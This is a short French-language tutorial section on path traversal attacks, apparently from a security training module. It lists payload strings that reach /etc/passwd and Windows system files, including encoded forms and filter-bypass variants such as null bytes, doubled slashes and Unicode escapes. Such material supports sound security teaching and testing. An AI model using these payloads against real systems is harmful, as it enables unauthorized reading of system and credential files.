Module Path Traversal

2. Techniques d'attaque Path Traversal

Techniques de base

Voici les principales techniques utilisées pour les attaques path traversal :

// Traversée simple
../../../etc/passwd
..\..\..\..\windows\win.ini

// Traversée absolue
/etc/passwd
C:\windows\system32\drivers\etc\hosts

// Double encodage
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

Techniques de contournement

Pour contourner les protections, plusieurs techniques peuvent être utilisées :

  • Null byte injection : ../../../etc/passwd%00.txt
  • Double slashes : ..//..//..//etc/passwd
  • Variations de points : ....//....//etc/passwd
  • Encodage Unicode : \u002e\u002e\u002f
